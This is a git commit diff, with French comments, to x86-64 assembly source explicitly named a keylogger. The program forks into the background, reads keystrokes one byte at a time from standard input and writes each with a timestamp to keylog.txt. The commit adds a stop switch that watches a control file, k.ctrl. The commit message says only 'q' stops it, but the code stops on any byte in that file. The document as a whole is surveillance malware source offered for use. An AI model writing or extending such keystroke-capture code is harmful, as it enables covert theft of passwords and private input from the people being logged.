e981181c2a21c82eca89554e113173fdef888759
bylife <bylife@bylife.fr>
2025-02-14 13:30:25 +0100

    fix bug keyloger et arrêt de celui-ci quand on met 'q' dans un fichier qu'on créée se nommant k.ctrl

--- keylogger.asm
+++ keylogger.asm
@@ -1,20 +1,22 @@
 section .data
     fname db "keylog.txt", 0
-    fd dq 0                
-    tbuf db 64 dup(0)      
-    nl db 0xa            
-    s db " | ", 0          
-    dpid dq 0           
+    ctrl_file db "k.ctrl", 0    ; fichier ctrl pour stop
+    fd dq 0                    ; stockage fd
+    ctrl_fd dq 0               ; fd ctrl
+    tbuf db 64 dup(0)          ; buffer timestamp
+    nl db 0xa                  ; retour
+    s db " | ", 0              ; separateur
+    dpid dq 0                  ; pid du fork
 
 section .bss
-    buf resb 1             
-    tspec resq 2           
+    buf resb 1                 ; stockage touche
+    tspec resq 2               ; temps
 
 section .text
 global _start
 
 _start:
-    ; fork
+    ; fork process
     mov rax, 57           
     syscall
     
@@ -24,60 +26,90 @@ _start:
     jmp parent           
 
 child:
-    ; init
+    ; init log
     mov rax, 2            
     mov rdi, fname
     mov rsi, 102o        
     mov rdx, 0644o       
     syscall
-    
-    mov [fd], rax        
+    mov [fd], rax
+
+    ; init ctrl       
+    mov rax, 2
+    mov rdi, ctrl_file
+    mov rsi, 102o
+    mov rdx, 0644o
+    syscall
+    mov [ctrl_fd], rax
 
 loop:
-    ; time
+    ; verif ctrl
+    mov rax, 3            
+    mov rdi, [ctrl_fd]
+    syscall
+
+    mov rax, 2            
+    mov rdi, ctrl_file
+    mov rsi, 0            
+    mov rdx, 0644o
+    syscall
+    mov [ctrl_fd], rax
+
+    ; lecture ctrl
+    mov rax, 0
+    mov rdi, [ctrl_fd]
+    mov rsi, buf
+    mov rdx, 1
+    syscall
+
+    ; check stop
+    cmp rax, 1           
+    je exit
+
+    ; get time
     mov rax, 228         
     mov rdi, 0           
     mov rsi, tspec
     syscall
 
-    ; read
+    ; lecture touche
     mov rax, 0                
     mov rdi, 0                
     mov rsi, buf
     mov rdx, 1                
     syscall
 
-    ; check q
-    cmp byte [buf], 'q'
-    je exit
+    ; check erreur
+    cmp rax, 0
+    jle loop
 
-    ; format
+    ; convertir temps
     mov rax, [tspec]
     mov rdi, tbuf
     call ft
 
-    ; write time
+    ; ecrire temps
     mov rax, 1                
     mov rdi, [fd]
     mov rsi, tbuf
     mov rdx, 20              
     syscall
 
-    ; write sep
+    ; ecrire sep
     mov rax, 1
     mov rdi, [fd]
     mov rsi, s
     mov rdx, 3
     syscall
 
-    ; write key
+    ; ecrire touche
     mov rax, 1                
     mov rdi, [fd]
     mov rsi, buf
     mov rdx, 1
     syscall
 
-    ; write nl
+    ; retour ligne
     mov rax, 1
     mov rdi, [fd]
     mov rsi, nl
@@ -87,13 +119,31 @@ loop:
     jmp loop
 
 parent:
+    ; cmd stop
+    mov rax, 2            
+    mov rdi, ctrl_file
+    mov rsi, 102o        
+    mov rdx, 0644o       
+    syscall
+
+    ; sortie parent
     mov rax, 60              
     xor rdi, rdi
     syscall
 
 exit:
+    ; nettoyage
     mov rax, 3                
     mov rdi, [fd]
+    syscall
+
+    mov rax, 3
+    mov rdi, [ctrl_fd]
+    syscall
+
+    ; supprime ctrl
+    mov rax, 87               
+    mov rdi, ctrl_file
     syscall
 
     mov rax, 60               
